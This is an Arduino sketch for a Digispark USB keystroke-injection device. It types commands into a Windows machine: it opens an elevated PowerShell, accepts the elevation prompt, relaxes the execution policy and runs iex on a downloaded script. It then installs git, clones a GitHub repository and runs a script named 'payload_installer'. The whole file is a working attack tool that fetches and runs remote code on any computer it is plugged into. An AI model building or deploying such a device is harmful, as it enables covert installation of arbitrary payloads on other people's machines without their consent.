#include "DigiKeyboard.h"
String repo;
String loc;
String script;
void setup() {
  digitalWrite(1, LOW);
  repo="https://github.com/xcs011/grappling-hook";
  loc="grappling-hook";
  script="payload_installer";
}
void loop() {
  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT);
  DigiKeyboard.print("pow");
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER,MOD_CONTROL_LEFT|MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("Set-ExecutionPolicy RemoteSigned -scope CurrentUser iex (new-object net.webclient).downloadstring('https://get.scoop.sh')");
  DigiKeyboard.delay(50);
  DigiKeyboard.print("y");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  DigiKeyboard.print("scoop install git");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("git clone"+repo);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("cd "+loc);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(".\\"+script);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, HIGH);
  for(;;) {}
}
